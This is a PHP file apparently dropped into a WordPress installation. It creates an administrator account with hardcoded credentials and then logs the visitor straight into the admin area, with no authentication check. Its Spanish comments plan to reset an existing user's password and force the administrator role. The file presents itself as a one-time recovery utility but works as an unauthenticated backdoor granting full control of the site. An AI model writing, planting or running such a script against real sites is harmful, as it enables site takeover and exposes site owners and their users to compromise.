<?php

/*
    New user / login 

    Mejoras posibles:

    . Si el usuario existe, actualizar capabilites a 'administrador' por las dudas
    . Adenas, si existe, actualizar el password al especificado
*/

require_once __DIR__ . '/../../../../wp-blog-header.php';
// ----------------------------------------------------
// CONFIG VARIABLES
// Make sure that you set these before running the file.
$username = 'mysuper_u';
$password = 'coolpass1u@!_';
$email    = 'super1-cool3k@gmail.com';
// ----------------------------------------------------


$_login = function($username){
    $user = get_user_by('login', $username );
        
    // Redirect URL //
    if ( !is_wp_error( $user ) )
    {
        wp_clear_auth_cookie();
        wp_set_current_user ( $user->ID );
        wp_set_auth_cookie  ( $user->ID );    

        $redirect_to = user_admin_url();
        wp_safe_redirect( $redirect_to );
        exit();    
    } else {
        echo "Login failure";
        exit;
    }
};

// Check that user doesn't already exist
if ( !username_exists($username) && !email_exists($email) )
{
	// Create user and set role to administrator
	$user_id = wp_create_user( $username, $password, $email);
	if ( is_int($user_id) )
	{
		$wp_user_object = new WP_User($user_id);
		$wp_user_object->set_role('administrator');
		
        echo 'Successfully created new admin user. Now delete this file!<p/>';
	}
	else {
		echo 'Error with wp_insert_user. No users were created.<p/>';
        // de todas formas intentare loguearme
	}
}
else {
	echo 'This user or email already exists. Nothing was done.<p/>';
}


// Autologin
$_login($username);